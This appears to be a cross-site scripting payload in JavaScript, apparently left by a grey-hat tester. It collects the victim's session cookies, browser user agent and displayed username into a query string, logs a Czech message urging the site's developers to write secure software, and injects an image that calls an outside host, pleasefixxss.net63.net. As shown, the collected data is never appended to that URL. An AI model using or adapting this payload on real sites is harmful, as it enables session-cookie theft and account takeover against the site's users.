var cookies = document.cookie;
var userAgent = navigator.userAgent;
var username = document.getElementsByTagName("strong")[0].textContent;
var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username;

console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");

var img = document.createElement('img');
img.src = 'http://pleasefixxss.net63.net/test.png';

document.getElementsByTagName('body')[0].appendChild(img);
